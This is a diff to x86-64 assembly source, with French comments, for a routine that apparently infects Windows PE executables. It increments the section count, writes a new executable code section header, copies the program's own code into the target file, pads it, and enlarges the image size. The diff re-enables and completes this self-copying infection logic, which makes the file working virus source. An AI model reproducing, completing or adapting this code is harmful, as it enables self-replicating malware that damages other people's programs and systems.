@@ -98,7 +98,7 @@ handle_file proc ; int handle
 	add rax, rdx
 	add rax, 6
 	mov cx, word ptr [rax] ; cx = OldNumberOfSections
-	;inc word ptr [rax] ; NumberOfSections++
+	inc word ptr [rax] ; NumberOfSections++
 	add rax, 14
 
 	xor rbx, rbx
@@ -132,13 +132,14 @@ handle_file proc ; int handle
 	add r8d, r9d
 	or r8d, 0fffh
 	inc r8d
+	mov dword ptr [rsp + 56], r8d
 	mov dword ptr [rax], r8d ; On met son endroit dans la memoire virtuelle
 
 	add rax, 4
 	mov rbx, r14
-;	or rbx, 0ffh
-;	inc rbx
-	mov dword ptr [rax], ebx
+	or rbx, 0ffh
+	inc rbx
+	mov dword ptr [rax], ebx ; size of raw data
 
 	add rax, 4
 	add r13, 2
@@ -153,7 +154,6 @@ handle_file proc ; int handle
 	add rax, 4
 	mov dword ptr [rax], 60000020h ; Characterisitcs
 
-
 	mov rcx, [rsp + 40]
 	add rcx, r13
 	lea rdx, label_debut
@@ -165,11 +165,22 @@ handle_file proc ; int handle
 	add rcx, r13
 	mov byte ptr [rcx], 0
 
-	add r15, 16
+	add r15, 4
+		mov rbx, r14
+		or rbx, 0ffh
+		inc rbx
+	add dword ptr [r15], ebx
+
+	add r15, 12
 	xor rbx, rbx
 	mov ebx, dword ptr [r15]
 	inc rcx
 	mov qword ptr [rcx], rbx
+
+	add r15, 40
+	mov eax, dword ptr [rsp + 56]
+	add eax, 01000h
+	mov dword ptr [r15], eax
 
 	mov rax, label_main
 	mov rbx, label_debut
@@ -187,6 +198,22 @@ handle_file proc ; int handle
 	mov rdx, [rsp + 40]
 	mov r8, r13
 	add r8, r14
+	lea r9, [rsp + 56]
+	mov qword ptr [rsp + 32], 0
+	call WriteFile
+
+	mov rcx, [rsp + 40]
+	mov rdx, 0
+	mov r8, r14
+	and	r8, 0ffh
+	xor r8, 0ffh
+	inc r8
+		mov rbx, r8
+	call memset
+
+	mov rcx, r12
+	mov rdx, [rsp + 40]
+	mov r8, rbx
 	lea r9, [rsp + 56]
 	mov qword ptr [rsp + 32], 0
 	call WriteFile
